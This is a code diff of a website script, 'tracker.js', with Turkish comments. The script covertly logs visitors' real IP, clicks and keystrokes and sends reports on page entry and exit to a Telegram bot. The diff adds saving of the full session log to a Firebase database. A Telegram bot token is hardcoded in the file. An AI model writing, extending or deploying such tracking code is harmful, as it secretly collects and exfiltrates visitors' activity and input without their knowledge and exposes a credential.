@@ -1,4 +1,4 @@
-/* tracker.js - v4.4 (FİNAL: GİRİŞ/ÇIKIŞ BAŞLIĞI NETLEŞTİRİLDİ) */
+/* tracker.js - v4.5 (DB Loglama Entegre) */
 
 // 🛑 TELEGRAM KONFİGÜRASYONLARI
 const BOT_TOKEN = "8581211195:AAHrd09lOZFr3_BKpuNyFcC2UP9Eq1PbGeo";
@@ -11,7 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const userGeo = generateFakeGeo(); 
     let userActivityLog = [];
     const MAX_LOG_COUNT = 50; 
-    let realIP = 'N/A'; // Gerçek IP'yi Telegram'dan alacağız
+    let realIP = 'N/A'; 
 
     function generateFakeIP() {
         return `10.42.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
@@ -89,7 +89,7 @@ URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;
 
         const now = new Date().toLocaleString('tr-TR');
         
-        // 🛑 GİRİŞ BİLDİRİM BAŞLIĞI
+        // GİRİŞ BİLDİRİM BAŞLIĞI
         const telegramMessage = `${ipFetchSuccess ? '🚨 *YENİ GİRİŞ YAPILDI!*' : '⚠️ *IP ÇEKİLEMEDİ!* (Giriş Bildirimi)'} \n\n` +
                         `📂 *Sayfa:* ${window.location.pathname}\n` +
                         `🕒 *Giriş:* ${now}\n` +
@@ -138,7 +138,7 @@ Action: Error Logged to Remote Server (Simulated)`;
     };
     
     // -----------------------------------------------------
-    // 4. OTURUM SONU VE ÇIKIŞ LOGU
+    // 4. OTURUM SONU VE ÇIKIŞ LOGU (DB KAYDI VE TELEGRAM)
     // -----------------------------------------------------
 
     window.addEventListener('beforeunload', () => {
@@ -148,7 +148,7 @@ Action: Error Logged to Remote Server (Simulated)`;
         const seconds = durationSeconds % 60;
         const sessionDuration = `${minutes}m ${seconds}s`;
         const totalActions = userActivityLog.length;
-        
+
         // KONSOL ÇIKIŞ LOGU VE RAPORU
         const exitLog = `
 [${new Date().toISOString()}] INFO: Session End (EXIT) | 
@@ -172,6 +172,22 @@ TOTAL ACTIONS: ${totalActions} Clicks/Keys Logged
              behaviorReportTelegram += "Minimal aktivite kaydedildi.";
         }
         
+        // 🛑 DB'YE GÖNDERİLECEK TAM LOG OBJESİ
+        const fullLogData = {
+            type: "SESSION_END",
+            url: window.location.pathname,
+            ip_real: realIP,
+            duration: sessionDuration,
+            actions: userActivityLog,
+            action_count: totalActions,
+            exit_time: new Date().toISOString()
+        };
+        // Logu DB'ye kaydetmeyi dene (addLogEntry firebase.js'ten gelir)
+        // Eğer firebase.js dosyası doğru yüklendiyse, log kalıcı olarak kaydedilir.
+        if (typeof addLogEntry === 'function') {
+             addLogEntry(fullLogData);
+        }
+
         // TELEGRAM ÇIKIŞ MESAJI
         const telegramExitMessage = `✅ *OTURUM SONLANDI: RAPOR*\n` +
                                     `📂 *Sayfa:* ${window.location.pathname}\n` +
